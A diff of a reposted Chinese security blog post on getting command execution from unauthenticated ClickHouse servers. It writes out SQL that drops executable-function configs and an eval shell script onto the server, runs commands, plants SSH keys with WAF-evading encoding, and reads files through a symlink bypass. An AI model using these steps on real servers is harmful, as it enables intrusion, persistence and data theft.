@@ -1,11 +1,26 @@
 #  从deepseek未授权探索clickhouse命令执行   
-Unam4  亿人安全   2025-02-21 00:07  
+Unam4  无影安全实验室   2025-02-20 20:20  
   
-文章首发在：奇安信攻防社区  
+免责声明：  
+本篇文章仅用于技术交流，  
+请勿利用文章内的相关技术从事非法测试  
+，  
+由于传播、利用本公众号无影安全  
+实验室所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号无影安全实验室及作者不为此承担任何责任，一旦造成后果请自行承担！  
+如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
   
-https://forum.butian.net/share/4155  
   
-探索clickhouse利用方式  
+  
+朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把"**无影安全实验室**  
+"设为星标，这样更新文章也能第一时间推送！  
+  
+![](https://mmbiz.qpic.cn/mmbiz_gif/3GHDOauYyUGbiaHXGx1ib5UxkKzSNtpMzY5tbbGdibG7icBSxlH783x1YTF0icAv8MWrmanB4u5qjyKfmYo1dDf7YbA/640?&wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "")  
+  
+  
+安全工具  
+  
+  
+  
 ### 0x01 简介  
   
 DeepSeek近期因未授权漏洞事件而引发严重的安全争议，该公司未加密的ClickHouse服务器，可以直接未授权访问。所以就有准备探索一下clickhouse这个数据库。  
@@ -74,12 +89,13 @@ https://github.com/ClickHouse/ClickHouse/blob/master/programs/server/config.xml
   
 这里注意文件名在config中默认配置为  
 ```
-<user_defined_executable_functions_config>*_function.*ml</user_defined_executable_functions_config>
+ <user_defined_executable_functions_config>*_function.*ml</user_defined_executable_functions_config>
 ```  
   
 所以文件名 用 xxx_function.xml 就好。  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4yw4gpWpbiavn6yZ0NvGNDGSl6flWOmAAoaOaGDGE5HfuOy8GKKsmoHg/640?wx_fmt=png&from=appmsg "")  
+  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxY7l07PJTtZwgNfzCaNFksJcbUpMUX6pPibib1j2jqNW1nzVWPiaxTsicwA/640?wx_fmt=png&from=appmsg "")  
   
 创建后可以进行查询  
   
@@ -99,11 +115,11 @@ https://github.com/ClickHouse/ClickHouse/blob/master/programs/server/config.xml
 <functions>    <function>        <type>executable</type>        <name>test_shell</name>        <return_type>String</return_type>        <argument>            <type>String</type>            <name>str</name>        </argument>        <format>raw</format>        <command>test_shell.sh</command>        <lifetime>1</lifetime>    </function></functions>
 ```  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4A4QYWibDPKWDc1432Dx56JTiacvNzMoGJdmphDegwbFiarIrm7KrjSxbw/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxUPSzF6KysUmpCiaRv2B71gKgvibDMeXN4bCRxHEKSoelwVvC7VFJun8g/640?wx_fmt=png&from=appmsg "")  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4N5CV38aA5BRkIichLIClX14KctTbzM8U5ak2iasGgylaN1VCharGMibicQ/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxEMQUBQibHdEMFNLB02CHESymSxPiaHYrWIKtAJ5cfeDCIFuBvIRSgbcw/640?wx_fmt=png&from=appmsg "")  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4L2TxsYhvuuibhmg3ibAplC8QicvXAeibw8iaeavwnk3ib0wtbBuhkVicwNUsg/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxUMUic1ichRvdEOs7BFOJQHwaU9ubKzfYcX3m72TR4ROoJVfmLRLfe5tg/640?wx_fmt=png&from=appmsg "")  
   
   
 反弹shell也是没毛病的。  
@@ -139,7 +155,7 @@ https://clickhouse.com/docs/en/engines/table-functions/executable
  SELECT * FROM executable('test_shell.sh', Raw, 'res String', (select 'echo hack by webchains-unam4'))
 ```  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP44Ova7VibdD7iaWXKJ6A9GAQRia1UDggh0XH7hjBYRPXo6er5fpIfHDHdQ/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxsWwOOgm7VmSGT7QFIaUKQ3RqSbnLF3bicc2iaPOKHpjbcy0iaJMicauVBw/640?wx_fmt=png&from=appmsg "")  
 ### 0x04 Executable  
   
 https://clickhouse.com/docs/en/engines/table-engines/special/executable  
@@ -161,7 +177,7 @@ Executable
 CREATE TABLE shell_table (res String) ENGINE = Executable('test_shell.sh', TabSeparated,  (select 'echo hack by webchains-unam4'))select * from shell_table
 ```  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4icVUicaKrtcibU3GZ3DGsS6VHnrrTt1rEiatZRj6bosib9PLCJPQ9dCGwZA/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxrAicQGIrRsvIgB56rxF5j9JDA600t4Uceab729ibC2dp5smMXcWFWoVQ/640?wx_fmt=png&from=appmsg "")  
 ### 0x05 INTO OUTFILE （输出的文件是到客户端）  
   
 我门肯定是希望结局sql语句来完成 命令执行的，所以我们可以借助INTO OUTFILE 来创建 xml 以及 sh or python 脚本。所以这只能本地命令执行 有点鸡肋。  
@@ -179,7 +195,7 @@ INTO OUTFILE
   
 **语法**  
 ```
-SELECT<expr_list>INTO OUTFILE file_name [AND STDOUT] [APPEND |TRUNCATE] [COMPRESSION type [LEVEL level]]
+SELECT <expr_list> INTO OUTFILE file_name [AND STDOUT] [APPEND | TRUNCATE] [COMPRESSION type [LEVEL level]]
 ```  
   
 file_name  
@@ -209,7 +225,7 @@ select '<functions>    <function>        <type>executable</type>      �
   
 可以看到写入后正常执行。  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4o9AgcHTeP8zBlI8Ojesk6L6BnCjpBoaBmGf7m7IKM4uQT22LT6GY1A/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZx82GQGaBtTO2QY4Dha7M7gW3WaRHEOnTxrY0vEEcBWb5p0loJ2qwKnw/640?wx_fmt=png&from=appmsg "")  
   
   
 来写脚本  
@@ -217,7 +233,7 @@ select '<functions>    <function>        <type>executable</type>      �
 select '<functions>    <function>        <type>executable</type>        <name>test_shell</name>        <return_type>String</return_type>        <argument>            <type>String</type>            <name>str</name>        </argument>        <format>raw</format>        <command>test_shell.sh</command>        <lifetime>1</lifetime>    </function></functions>' into outfile '/etc/clickhouse-server/shell2_function.xml' TRUNCATE format rawselect '#!/bin/bashwhile read read_data;    do eval " $read_data ";done' into outfile '/var/lib/clickhouse/user_scripts/test_shell.sh' TRUNCATE format raw
 ```  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4ja7QGwnd1GWWkMLPceCnKtjTq12jtTviatNZZG2HgUibpjCNWL1diaAbQ/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZx54eC37eMY0NRplbzof1fzJtsx4RoYg1c36dJia8mn3zt9Nd7tCjXeTQ/640?wx_fmt=png&from=appmsg "")  
   
 这个时候执行的时候会提示没有权限，答案是写入的test_shell.sh没有执行权限。  
   
@@ -226,7 +242,7 @@ select '<functions>    <function>        <type>executable</type>      �
 select '<functions>    <function>        <type>executable</type>        <name>shell</name>        <return_type>String</return_type>        <format>raw</format>        <command>chmod +x /var/lib/clickhouse/user_scripts/test_shell.sh</command>        <execute_direct>0</execute_direct>        <lifetime>1</lifetime>    </function></functions>' into outfile '/etc/clickhouse-server/shell_function.xml' TRUNCATE format raw
 ```  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4tuTdmZrdLMhric4k9kM5cRM3Fiaic7xWP3x5vorPdva5oOUWicaokVCLVA/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxnQBPuMuUS4d44m7eAdckmDKULzunichETWUialXMfHdDicC8UicCaZUhiaQ/640?wx_fmt=png&from=appmsg "")  
   
 然后就有执行权限了  
 ### 0x06 encode  
@@ -245,14 +261,14 @@ https://clickhouse.com/docs/en/sql-reference/functions/encoding-functions
   
 这里直接使用binary编码后在解码写入公钥。  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4pcic1C9VgxUiaRRs4Rgdr1M4lqgic5a4BZJF9nALtnZrUow3MIVCicouPQ/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxqF6LdibiaPsia6nkvicrImpwrAJqcw2oSHDibkUDF9JN3sDtO5YqnyWedpw/640?wx_fmt=png&from=appmsg "")  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP43hdjEIVUMaSibicsP3Qhmib8Oq4hAmfox0GCU819T9Je8vibsP4M3WOm7w/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxBTeynprpI38cbYVDarlyiahHOe2Iduqtym857Pd7PFw77XOKvPmp1QQ/640?wx_fmt=png&from=appmsg "")  
   
   
 也可以使用hex编码，char  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4lo3u1CXHhluzkVzicnoYVlaMVZribwS6AwwfqDsvZibygDbkzopCZ3dzA/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxdY50CNOtx5TtkTbW4EVriaIrsRB8Jnx1ncRlGb3gMV2xUwWIraQqKicg/640?wx_fmt=png&from=appmsg "")  
   
 不用想，以后拿来绕waf极好的  
 ### 0x07 file 文件读取  
@@ -270,7 +286,7 @@ file
   
 file接口可以直接读取文件。  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4cE7f1DW6p470PLLbzPJqEsqwIoibYuNfiax9lGuWdgJKMabdFC5zqusA/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxPZrreyV2lKb6Kq4HAWhKiaGmg5SvFym6ecDGqbfthnThVof4uiapQqzA/640?wx_fmt=png&from=appmsg "")  
   
 但是在只能读/user_files下的文件。  
   
@@ -278,13 +294,13 @@ file接口可以直接读取文件。
   
 在低版本下可以直接使用../../进行读取 （枇杷哥）  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4R0KTVs73VpxafPQUgibiaxnZ4xPLVLFykLgfGzhq0k466aCU0biboe7pg/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxCBHGo9w1cPuPOLPwU5dqoPvSEAicmzqauVLztKKZnOYyMicUv6gY9GDw/640?wx_fmt=png&from=appmsg "")  
   
 那新版本可以绕过吗？ 有的，我们只需要ln -s 软连接目录到user_files即可。  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4vic5mDOmoL1NemYJecSPj9uypzTCTxqdYlTb7OHwO9RABiaibibSTAJUcg/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxcL0zT41iazzQSDWWlGZfjAiaQ0RDWnH9dNiaDaPic2akHmla7Pfs2k9UVg/640?wx_fmt=png&from=appmsg "")  
   
-![图片.png](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrRqb9icRaLQy4eicmuN2fcP4qt8FrLBPafZsQPM4TBvgURwjIjPibuRzA2RgoURCHKWx7Wc0Ticzhwdg/640?wx_fmt=png&from=appmsg "")  
+![图片.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFERibB4viaZfBAoYAj588nThZxPI6GADdCNcDJKCHwb0JPibx9JibBWicPVw943HwsLzWib39R5t4t8bz2iaQ/640?wx_fmt=png&from=appmsg "")  
 ### 0x08 more 思考  
   
 还有许多有意思的函数，比如 url函数，可以去网络上的文件，mysql、postgresql、redis、sqlite、mongodb等他可以直接连接数据库查询，也就是可以利用clickhouse进行内网数据库横向等。  
@@ -295,7 +311,7 @@ https://clickhouse.com/docs/en/sql-reference/table-functions/jdbc
   
 开启 clickhouse-jdbc-bridge，还是直接进行jdbc连接。  
 ```
-SELECT*FROM jdbc('jdbc:mysql://localhost:3306/?user=root&password=root', 'schema', 'table')
+SELECT * FROM jdbc('jdbc:mysql://localhost:3306/?user=root&password=root', 'schema', 'table')
 ```  
   
 那么是不是就可以直接攻击mysql，postgresql，h2等java jdbc攻击  
@@ -313,7 +329,12 @@ https://clickhouse.com/docs/en/sql-reference/table-functions/azureBlobStorage
 以及在java中，做反序列化gadget的可能性，driud，c3p0，Hibernate ，hikari，dbcp等可以在jdbc连接时执行sql的gagdegt，我想大概可以的。  
 ### 致谢以引用  
   
-https://github.com/Java-Chains  
+https://gi  
+thub.com/Java-Chains  
   
 https://clickhouse.com/docs  
--   
+  
+最后推荐一下小密圈，干货满满，物超所值，**内部圈子每增加100人，价格将上涨20元，越早进越优惠嗷~~**  
+  
+![图片](https://mmbiz.qpic.cn/mmbiz_jpg/awCdqJkJFERvgmiaRWOkaOT8aCVKhAf4Yab5X63k4NpTL9CzAmhw61VKGWrkCzd8LZIdEgUrlfhU8ib65tVG6EiaQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
